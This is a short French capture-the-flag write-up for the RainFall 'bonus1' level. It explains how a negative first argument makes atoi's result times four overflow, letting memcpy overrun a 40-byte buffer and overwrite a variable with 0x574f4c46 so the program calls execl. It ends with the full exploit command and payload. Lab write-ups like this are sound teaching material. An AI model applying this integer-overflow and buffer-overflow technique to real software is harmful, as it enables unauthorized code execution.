#bonus1

$ ./bonus1
Segmentation fault (core dumped)
$ ./bonus1 test
$ ./bonus1 test test

On a bonus1 qui segfault sans argument.

Après analyse avec gdb du main, on observe un memcpy qui est vulnerable au buffer overflow.

Le programme prend deux arguments:

    - le premier est converti avec atoi et stocker dans nb. Pour accéder au memcpy, il faut que nb soit inférieur ou égale à 9.
    - le second est copié dans un buffer de 40 en dessous du retour d'atoi. Ensuite nb est comparé à 0x574f4c46, s'il est égal, le programme appelle execl().
    Le problème est que memcpy copie seulement 4*nb de argv[2]. Donc le maximun est 36 car 9*4 = 36. Donc au lieu d'utiliser un nombre positif, on peut utiliser un nombre négatif.


                                                   32 bits
                                                      |
int_min     = 0000 0000 0000 0000 0000 0000 0000 0000 | 1000 0000 0000 0000 0000 0000 0000 0001 = -2147483647
int_min * 4 = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0000 0100 = 4


random_int   = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100 = 44 (-8589934548)
random_int/4 = -2147483637


bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')